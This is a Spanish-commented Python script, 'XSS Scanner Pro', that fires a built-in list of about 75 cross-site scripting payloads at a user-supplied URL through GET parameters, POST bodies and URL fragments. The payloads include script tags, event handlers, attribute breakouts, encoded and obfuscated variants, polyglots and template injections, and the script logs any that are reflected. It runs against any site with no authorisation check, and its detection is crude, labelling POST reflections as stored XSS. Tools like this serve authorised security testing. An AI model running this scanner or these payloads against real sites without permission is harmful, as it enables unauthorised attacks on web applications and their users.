import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import re
import sys
from datetime import datetime
import os

# ===== COLORES =====
V = "\033[92m"
A = "\033[93m"
R = "\033[91m"
C = "\033[96m"
B = "\033[1m"
N = "\033[0m"

def banner():
    print(f"{C}{B}╔{'═'*48}╗")
    print(f"║{' '*12}XSS Scanner Pro{' '*12}║")
    print(f"╚{'═'*48}╝{N}\n")

def cargar_payloads():
    """Carga payloads desde archivo o usa los integrados"""
    payloads = [
        # ===== BÁSICOS =====
        "<script>alert(1)</script>",
        "<script>alert('XSS')</script>",
        "<script>prompt(1)</script>",
        "<script>confirm(1)</script>",
        "<script>document.write('XSS')</script>",
        "<script>console.log('XSS')</script>",
        
        # ===== EVENTOS HTML =====
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=alert('XSS')>",
        "<img src=x onerror=prompt(1)>",
        "<img src=x onerror=confirm(1)>",
        "<svg onload=alert(1)>",
        "<svg onload=prompt(1)>",
        "<svg onload=confirm(1)>",
        "<body onload=alert(1)>",
        "<body onload=prompt(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<input onfocus=prompt(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<marquee onstart=prompt(1)>",
        "<details open ontoggle=alert(1)>",
        "<details open ontoggle=prompt(1)>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<video onloadstart=alert(1) src=x>",
        "<audio onloadstart=alert(1) src=x>",
        "<keygen onfocus=alert(1) autofocus>",
        
        # ===== ROMPIENDO ATRIBUTOS =====
        '\"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '\"><img src=x onerror=alert(1)>',
        "'><img src=x onerror=alert(1)>",
        '\'"><script>alert(1)</script>',
        "</textarea><script>alert(1)</script>",
        "</title><script>alert(1)</script>",
        "</style><script>alert(1)</script>",
        "';alert(1);//",
        '";alert(1);//',
        "'-alert(1)-'",
        '"-alert(1)-"',
        "><script>alert(1)</script>",
        "><img src=x onerror=alert(1)>",
        "><svg onload=alert(1)>",
        
        # ===== JAVASCRIPT =====
        "javascript:alert(1)",
        "javascript:alert('XSS')",
        "javascript:prompt(1)",
        "javascript:confirm(1)",
        "javascript:void(alert(1))",
        "javascript:document.write('XSS')",
        
        # ===== OFUSCADOS =====
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<SCrIpT>alert(1)</SCrIpT>",
        "<ScRiPt>alert(1)</ScRiPt>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "%3Cimg%20src=x%20onerror=alert(1)%3E",
        "&lt;script&gt;alert(1)&lt;/script&gt;",
        
        # ===== POLÍGLOTAS =====
        '\'"><script>alert(1)</script><img src=x onerror=alert(1)>',
        "javascript:/*--></title></style></textarea></script></xmp><svg onload='alert(1)'>",
        '\"><svg/onload=alert(1)><img src=x onerror=alert(1)>',
        "'><svg/onload=alert(1)><img src=x onerror=alert(1)>",
        
        # ===== TEMPLATES =====
        "{{constructor.constructor('alert(1)')()}}",
        "{{7*7}}",
        "${alert(1)}",
        "#{alert(1)}",
        "*{alert(1)}",
        "{php}echo 'XSS';{/php}",
        
        # ===== DOM =====
        '#"><script>alert(1)</script>',
        "//\"><script>alert(1)</script>",
        "javascript:alert(1)//",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    ]
    return payloads

def analizar_respuesta(response, payload):
    """Analiza si el payload se refleja en la respuesta"""
    if payload in response.text:
        return True, "Reflejado exacto"
    
    decoded = payload.replace("%3C", "<").replace("%3E", ">").replace("%2F", "/")
    if decoded in response.text:
        return True, "Reflejado decodificado"
    
    partes = payload.split(">")
    for parte in partes:
        if len(parte) > 10 and parte in response.text:
            return True, "Reflejado parcial"
    
    return False, ""

def test_reflected(url, payloads, encontrados, archivo):
    """Prueba XSS Reflejado en parámetros GET"""
    print(f"\n{B}[*] Probando XSS Reflejado (GET){N}\n")
    
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if not params:
        print(f"  {A}[!] No se detectaron parámetros GET. Añadiendo ?q={N}")
        test_urls = [(url + "?q=" + p, "q") for p in payloads]
    else:
        test_urls = []
        for param in params:
            for p in payloads:
                new_params = params.copy()
                new_params[param] = [p]
                new_query = urlencode(new_params, doseq=True)
                new_url = urlunparse(parsed._replace(query=new_query))
                test_urls.append((new_url, param))
    
    for test_url, param in test_urls:
        try:
            r = requests.get(test_url, timeout=5, allow_redirects=False)
            for p in payloads:
                vulnerable, tipo = analizar_respuesta(r, p)
                if vulnerable:
                    print(f"  {V}[!] REFLECTED XSS [{param}]{N}")
                    print(f"  URL: {test_url}")
                    print(f"  Payload: {p[:60]}")
                    print(f"  Tipo: {tipo}\n")
                    encontrados.append(("Reflected", test_url, p, param))
                    archivo.write(f"[Reflected] {test_url} | Param: {param} | Payload: {p}\n")
                    break
        except:
            pass

def test_stored(url, payloads, encontrados, archivo):
    """Prueba XSS Almacenado (POST)"""
    print(f"\n{B}[*] Probando XSS Almacenado (POST){N}\n")
    
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if not params:
        print(f"  {A}[!] Sin parámetros para POST{N}\n")
        return
    
    for param in params:
        for p in payloads[:30]:
            data = {param: p}
            try:
                r = requests.post(url, data=data, timeout=5)
                vulnerable, tipo = analizar_respuesta(r, p)
                if vulnerable:
                    print(f"  {V}[!] STORED XSS [{param}]{N}")
                    print(f"  URL: {url}")
                    print(f"  Payload: {p[:60]}")
                    print(f"  Tipo: {tipo}\n")
                    encontrados.append(("Stored", url, p, param))
                    archivo.write(f"[Stored] {url} | Param: {param} | Payload: {p}\n")
                    break
            except:
                pass

def test_dom(url, payloads, encontrados, archivo):
    """Prueba XSS basado en DOM"""
    print(f"\n{B}[*] Probando XSS basado en DOM{N}\n")
    
    dom_payloads = [
        '#"><script>alert(1)</script>',
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "//evil.com",
    ]
    
    for p in dom_payloads:
        test_url = url + p
        try:
            r = requests.get(test_url, timeout=5)
            if p in r.text:
                print(f"  {V}[!] DOM XSS potencial{N}")
                print(f"  URL: {test_url}")
                print(f"  Payload: {p}\n")
                encontrados.append(("DOM", test_url, p, ""))
                archivo.write(f"[DOM] {test_url} | Payload: {p}\n")
        except:
            pass

def info_objetivo(url):
    """Muestra información del objetivo"""
    print(f"{B}[*] Información del objetivo{N}\n")
    try:
        r = requests.get(url, timeout=5)
        server = r.headers.get("Server", "Desconocido")
        powered = r.headers.get("X-Powered-By", "Desconocido")
        print(f"  URL: {url}")
        print(f"  Servidor: {server}")
        print(f"  Powered-By: {powered}")
        print(f"  Status: {r.status_code}")
        print(f"  Tamaño: {len(r.content)} bytes\n")
    except:
        print(f"  {R}[!] No se pudo conectar al objetivo{N}\n")
        return False
    return True

def main():
    banner()
    
    url = input(f"{B}URL objetivo:{N} ").strip()
    if not url.startswith("http"):
        url = "http://" + url
    
    if not info_objetivo(url):
        return
    
    payloads = cargar_payloads()
    print(f"[*] Payloads cargados: {len(payloads)}\n")
    
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    nombre_archivo = f"xss_scan_{url.replace('://', '_').replace('/', '_')[:30]}_{ts}.txt"
    encontrados = []
    
    with open(nombre_archivo, "w") as f:
        f.write(f"XSS Scanner Pro\n")
        f.write(f"Objetivo: {url}\n")
        f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"{'='*50}\n\n")
        
        test_reflected(url, payloads, encontrados, f)
        test_stored(url, payloads, encontrados, f)
        test_dom(url, payloads, encontrados, f)
        
        f.write(f"\n{'='*50}\n")
        f.write(f"Total: {len(encontrados)} vulnerabilidades\n")
    
    print(f"\n{C}{B}{'='*50}{N}")
    print(f"{C}{B}   RESULTADOS FINALES{N}")
    print(f"{C}{'='*50}{N}")
    print(f"  Vulnerabilidades encontradas: {V}{len(encontrados)}{N}")
    print(f"  Payloads probados: {len(payloads)}")
    print(f"  Tipos: GET + POST + DOM")
    print(f"  Archivo: {nombre_archivo}")
    print(f"{C}{'='*50}{N}\n")
    
    if encontrados:
        for i, (tipo, url_vuln, payload, param) in enumerate(encontrados, 1):
            print(f"  {i}. [{tipo}] {param if param else 'N/A'}")
            print(f"     URL: {url_vuln[:80]}")
            print(f"     Payload: {payload[:60]}\n")
    else:
        print(f"  {A}No se encontraron vulnerabilidades XSS.{N}\n")
    
    os.system("pause")

if __name__ == "__main__":
    main()
